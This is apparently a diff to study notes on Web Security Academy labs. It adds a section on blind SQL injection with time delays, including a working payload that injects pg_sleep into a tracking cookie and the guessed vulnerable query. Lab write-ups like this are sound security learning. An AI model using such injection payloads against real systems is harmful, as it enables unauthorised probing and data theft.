@@ -97,3 +97,22 @@ In Intruder:
 - Sort by `payload 1`
 
 ![results-blind-oracle](images/results-blind-oracle.png)
+
+## Blind SQL injection with time delays
+
+```
+# Initial Request
+GET / HTTP/2
+Host: 0a90000004d38cd582d738de00420061.web-security-academy.net
+Cookie: TrackingId=JjlpMTlWKJlheKxz; session=dZKT5XYtz3AaPgvoqAwIeiJnN7HBISHL
+
+# Working example using string concatenation
+Cookie: TrackingId=oheSoImFDflJjeUv'|| pg_sleep(10) --; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+```
+
+The SQL query on the srv might look like this
+
+``` sql
+SELECT userid FROM tracking where id='${trackingId}'
+```
+
